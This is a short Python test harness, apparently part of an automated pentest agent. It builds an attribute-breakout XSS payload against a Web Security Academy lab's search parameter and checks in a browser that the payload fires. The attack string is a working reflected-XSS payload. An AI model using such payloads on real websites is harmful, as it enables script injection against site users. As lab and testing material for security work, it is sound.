import os
import traceback
from contextlib import redirect_stdout, redirect_stderr
from io import StringIO
from typing import Dict, Optional
import re
import sys

from pentest_bot.web_exploit.tools.browser_check import create_browser_check_xss

if __name__ == "__main__":
    from pentest_bot.web_exploit.tools.interpreter import PythonInterpreter

    browser_check_template, check_cb, target_url = create_browser_check_xss()

    script = r"""
import urllib.parse

base = "https://0a1d004903fcd2d5808d2be0008800ee.web-security-academy.net/"
# Break out of the quoted attribute and load our external image
payload = '\">\x3Cimg src={target_url}>'
attack_url = base + "?search=" + urllib.parse.quote(payload, safe="")
print("[*] Testing attack URL:", attack_url)

# Invoke the provided helper to trigger and verify the XSS
browser_check_xss(url=attack_url)
""".format(target_url=target_url)

    interpreter = PythonInterpreter(shared_globals=browser_check_template)
    res = interpreter.run(script)
    print(res)
